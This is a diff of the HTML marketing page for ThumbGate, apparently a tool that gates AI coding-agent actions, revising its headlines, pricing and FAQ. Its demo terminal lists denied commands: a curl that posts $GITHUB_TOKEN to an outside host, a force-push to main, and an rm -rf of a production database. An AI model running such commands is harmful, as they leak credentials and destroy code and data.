@@ -13,10 +13,10 @@
   <meta property="og:image" content="https://thumbgate.ai/og.png">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://thumbgate.ai/og.png">
-  <title>ThumbGate — Stop AI agent mistakes before they cost you</title>
-  <meta name="description" content="Stop AI agent mistakes before they cost you. Self-serve is $19/mo; the $499 Diagnostic installs one hard, test-backed safety gate for a supported AI-agent workflow in two business days.">
-  <meta property="og:title" content="ThumbGate — Stop AI agent mistakes before they cost you">
-  <meta property="og:description" content="Not a prompt. Not a postmortem. Pre-action gates + dual path: $19/mo Pro or $499 Diagnostic gate.">
+  <title>ThumbGate — Block the agent action before it runs</title>
+  <meta name="description" content="A detected secret is denied by default. Force-push to main is allowed until strict mode is on. Pro is $19/mo. The $499 Diagnostic installs one hard, test-backed safety gate for a supported AI-agent workflow in two business days.">
+  <meta property="og:title" content="ThumbGate — Block the agent action before it runs">
+  <meta property="og:description" content="Not a prompt. Not a postmortem. A detected secret is denied by default. Pro is $19/mo. The $499 diagnostic covers one workflow.">
   <meta property="og:type" content="website">
   <meta property="og:url" content="__APP_ORIGIN__/">
   <script defer data-domain="thumbgate.ai" src="https://plausible.io/js/script.tagged-events.js"></script>
@@ -47,8 +47,8 @@
       "Relevant lessons are re-ranked for the proposed action",
       "Repeated negative patterns can promote from warning to blocking gates",
       "Stale auto-promoted gates expire and stale lessons archive",
-      "Managed Enterprise Workflow Gate for one supported workflow",
-      "Local-first install with optional shared team enforcement"
+      "Diagnostic Gate for one supported local workflow",
+      "Local-first install. Hosted team features are not generally available."
     ]
   }
   </script>
@@ -90,8 +90,8 @@
   {
     "@context": "https://schema.org",
     "@type": "Service",
-    "name": "Enterprise Workflow Gate",
-    "description": "ThumbGate's $499 enterprise entry offer for one repeated AI-agent workflow failure, including a failure map, configured local gate, regression test, and rollout proof.",
+    "name": "Diagnostic Gate",
+    "description": "ThumbGate's $499 diagnostic for one repeated AI-agent workflow failure, including a failure map, configured local gate, regression test, and rollout proof.",
     "provider": { "@type": "Organization", "name": "ThumbGate" },
     "offers": {
       "@type": "Offer",
@@ -128,7 +128,7 @@
         "name": "Is this the enterprise option?",
         "acceptedAnswer": {
           "@type": "Answer",
-          "text": "Yes. The $499 Enterprise Workflow Gate is the enterprise entry offer for one supported workflow. It is not an org-wide hosted platform license: shared hosting, SSO, compliance packaging, and multi-workflow rollout require separate scope and are not generally available."
+          "text": "No. The $499 offer is one workflow. Hosted Enterprise, SSO, and an org-wide audit log are not generally available."
         }
       },
       {
@@ -695,8 +695,7 @@
         <a href="#how-it-works">How it works</a>
         <a href="#offers">Pricing</a>
         <a href="#proof">Proof</a>
-        <a class="nav-buy" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_nav&amp;utm_campaign=rally_style_gtm&amp;cta_id=nav_pro_buy&amp;cta_placement=nav&amp;plan_id=pro" data-offer-link data-cta-id="nav_pro_buy">Pro · $19/mo</a>
-        <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-cta-id="nav_diagnostic_buy">Get Started · $499</a>
+        <a class="nav-buy" href="#install">Install free</a>
       </div>
     </div>
   </nav>
@@ -706,21 +705,21 @@
     <section class="hero">
       <div class="shell hero-grid">
         <div class="hero-copy">
-          <div class="eyebrow">Pre-action firewall · &lt;0.5ms local · Not a prompt · Not a postmortem</div>
+          <div class="eyebrow">Pre-action firewall · Not a prompt · Not a postmortem</div>
           <div class="hero-thumbs" aria-hidden="true"><span class="up">👍</span><span class="down">👎</span></div>
-          <h1>Stop AI agent mistakes before they cost you.</h1>
-          <p class="hero-lede">Autonomous agents write, send, deploy, and install packages at inference speed — where breakout takes 27 seconds. Strip human-equivalent credentials and enforce hard allow/deny in <strong>&lt;0.5ms at the tool-call boundary</strong>, before execution.</p>
-          <div class="hero-terminal" aria-label="Live pre-action interception demo">
+          <h1>Block the agent action before it runs.</h1>
+          <p class="hero-lede">A static deny list only catches the commands you already wrote down. ThumbGate denies a detected secret by default. Force-push to main is allowed until strict mode is on.</p>
+          <div class="hero-terminal" aria-label="Default and strict gate decisions">
             <div class="terminal-chrome" aria-hidden="true">
               <div class="dots"><span></span><span></span><span></span></div>
-              <span class="title">pretooluse · 0.4ms</span>
+              <span class="title">local gate</span>
               <span>local</span>
             </div>
-            <pre>curl -d "$GITHUB_TOKEN" https://...   → <span style="color:var(--red);font-weight:800">DENY</span> (secret leak)
-git push --force origin main          → <span style="color:var(--red);font-weight:800">DENY</span> (strict gate)
-rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);font-weight:800">DENY</span> (from 👎 rule)</pre>
+            <pre>curl -d "$GITHUB_TOKEN" https://example.invalid  → <span style="color:var(--red);font-weight:800">DENY</span> (default)
+git push --force origin main                     → <span style="color:var(--green);font-weight:800">ALLOW</span> (default)
+git push --force origin main                     → <span style="color:var(--red);font-weight:800">DENY</span> (strict mode only)</pre>
           </div>
-          <p class="install-hint"><strong style="color:var(--text)">Free (MIT):</strong> <code>npx thumbgate init</code> <button type="button" class="copy-cmd" data-copy-install data-cta-id="hero_install_copy" style="margin-left:8px">Copy</button> · <a href="/pricing">Free vs. Pro →</a></p>
+          <p class="install-hint" id="install"><strong style="color:var(--text)">Free (MIT):</strong> <code>npx thumbgate init</code> <button type="button" class="copy-cmd" data-copy-install data-cta-id="hero_install_copy" style="margin-left:8px">Copy</button> · <a href="/pricing">Free vs. Pro →</a></p>
           <p class="fit-line" style="margin-top:12px;"><strong>Pro at $19/mo</strong> or <strong>$499 Diagnostic</strong> on Claude Code, Cursor, Codex, or similar agents. Free local evaluate stays free.</p>
             <span class="spec-chip"><strong>Capture</strong> feedback</span>
             <span class="spec-chip"><strong>Rank</strong> lessons</span>
@@ -731,20 +730,20 @@ rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);
             <img src="/assets/diagrams/hero-thumbs.svg" width="640" height="360" alt="ThumbGate: thumbs up and thumbs down become a pre-action gate that can ALLOW, WARN, or DENY before the tool call runs" loading="eager" decoding="async">
           </figure>
           <div class="trust-strip" aria-label="Verified engineering proof">
-            <span>7 CLIs · &lt;0.5ms p95 · Local SQLite</span>
+            <span>Free local install · Pro $19/mo · $499 diagnostic</span>
           </div>
           <p class="install-hint" id="thumbgate-dashboard-command" style="margin-top:10px;">Dashboard: <code>npx thumbgate dashboard --open</code> · <code>/thumbgate-dashboard</code> · <code>thumbgate-dashboard</code> · <a href="/dashboard#insights">demo</a> · <a class="proof-link" href="#proof">strict-mode deny example ↓</a></p>
         <div id="offers" class="offer-stack">
           <aside class="pro-card" id="pro" aria-label="ThumbGate Pro subscription">
             <div class="price"><strong>$19</strong><span>/mo · or $149/yr</span></div>
-            <h2>Pro</h2>
-            <p><strong>Self-serve for developers.</strong> Unlimited gates, visual debugger, recall, and DPO exports.</p>
+            <h2>Pro · $19/mo</h2>
+            <p><strong>Self-serve for developers.</strong> Unlimited gates, visual debugger, and recall.</p>
             <a class="button-pro" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_hero&amp;utm_campaign=rally_style_gtm&amp;cta_id=homepage_pro_buy&amp;cta_placement=hero&amp;plan_id=pro" data-offer-link data-cta-id="homepage_pro_buy" data-revenue-cta data-cta-placement="hero">Start Pro — $19/mo</a>
             <p class="checkout-note">Instant key · cancel anytime · free local evaluate stays free</p>
             <ul class="offer-points">
               <li>Unlimited gates + rule packs (Claude, Cursor, Git, AWS)</li>
-              <li>Visual gate debugger, dashboard &amp; multi-hop recall</li>
-              <li>1-click DPO &amp; HuggingFace exports from 👍/👎</li>
+              <li>Visual gate debugger and dashboard</li>
+              <li>Hosted sync, the dashboard, and adapter coverage</li>
             </ul>
           </aside>
           <form id="buy" class="checkout-card" action="/go/diagnostic-pay" method="POST" data-primary-checkout style="border-color:rgba(0,110,82,.35);box-shadow:0 18px 50px rgba(0,110,82,.12);">
@@ -878,9 +877,9 @@ rm -rf ./prod-db &amp;&amp; git reset --hard  → <span style="color:var(--red);
 
     <section id="deliverables">
       <div class="shell">
-        <div class="section-kicker">What the $499 enterprise gate buys</div>
+        <div class="section-kicker">What the $499 diagnostic buys</div>
         <h2 class="section-title">A managed gate for one painful workflow.</h2>
-        <p class="section-lede">Enterprise entry for one workflow—not an org-wide platform license.</p>
+        <p class="section-lede">One workflow. Not an org-wide platform license.</p>
         <div class="deliverables">
           <article class="deliverable">
             <h3>Failure map</h3>
@@ -945,7 +944,7 @@ next      decision recorded before execution</pre>
           </div>
           <div class="faq-item">
             <button class="faq-q" type="button" aria-expanded="false">Is this the enterprise option?</button>
-            <div class="faq-a">Yes. The $499 Enterprise Workflow Gate is the enterprise entry offer for one supported workflow. It is not an org-wide hosted platform license: shared hosting, SSO, compliance packaging, and multi-workflow rollout require separate scope and are not generally available.</div>
+            <div class="faq-a">No. The $499 offer is one workflow. Hosted Enterprise, SSO, and an org-wide audit log are not generally available.</div>
           </div>
           <div class="faq-item">
             <button class="faq-q" type="button" aria-expanded="false">Does self-improving mean ThumbGate retrains my model?</button>
@@ -966,7 +965,7 @@ next      decision recorded before execution</pre>
         <p class="section-lede">Run <code>npx thumbgate init</code> (MIT), upgrade to <strong style="color:var(--text)">Pro ($19/mo)</strong> for unlimited gates, or book a <strong style="color:var(--text)">$499 setup</strong>.</p>
         <div style="display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:22px">
           <a class="nav-buy" href="/checkout/pro?utm_source=website&amp;utm_medium=homepage_final&amp;utm_campaign=pro_self_serve&amp;cta_id=final_pro_buy&amp;cta_placement=final&amp;plan_id=pro" data-offer-link data-cta-id="final_pro_buy">Start Pro — $19/mo</a>
-          <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-cta-id="final_diagnostic_buy">Buy the $499 enterprise gate</a>
+          <a class="nav-enterprise" href="#enterprise-gate" data-offer-link data-cta-id="final_diagnostic_buy">Buy the $499 diagnostic</a>
         </div>
       </div>
     </section>
